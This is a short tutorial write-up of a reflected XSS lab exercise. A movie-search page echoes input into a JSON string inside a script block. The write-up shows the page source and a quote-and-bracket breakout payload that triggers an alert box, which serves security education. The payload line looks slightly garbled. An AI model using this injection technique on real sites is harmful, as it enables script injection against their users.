## Page Content:

When we open the page we will see an input field which requires a movie name to be entered. If we entered a movie that already exists in the database we will see that a message will be displayed that says:

> Yes! We have that movie ..

And if not found then the message will be:

> \< Movie Name \>??? Sorry, we don't have that movie

That means any wrong entry will be reflected and that is what we are looking for in order to exploit the XSS vulnerability.

## First Trial:

When we try to enter a script to see the webpage's behaviour on encountering an unexpected input, like this script:

```javascript
<script> alert("XSS") </script>
```
The response we get is:
>??? Sorry, we don't have that movie :("}]}'; // var JSONResponse = eval ("(" + JSONResponseString + ")"); var JSONResponse = JSON.parse(JSONResponseString); document.getElementById("result").innerHTML=JSONResponse.movies[0].response;

And when we view the page source we find the following code snippet:

```javascript
<script>

var JSONResponseString = '{"movies":[{"response":"<script> alert("XSS")</script>??? Sorry, we don&#039;t have that movie :("}]}';
// var JSONResponse = eval ("(" + JSONResponseString + ")");
var JSONResponse = JSON.parse(JSONResponseString);   document.getElementById("result").innerHTML=JSONResponse.movies[0].response;

 </script>
```

We can see that the injected script is written between double quotes and when the code executes and it gets to the \<script\> tag in the payload it misses the other quote, which means that if we wish to run the script we want we have to close or opened brackets and quotes before writing our script, and that is by using the following code:

```javascript
("}]}';alert("XSS")</script>
```

And after that we will get an alert box with the message "XSS" inside it, which means that we had successfully managed to exploit the XSS vunerability in this webpage.

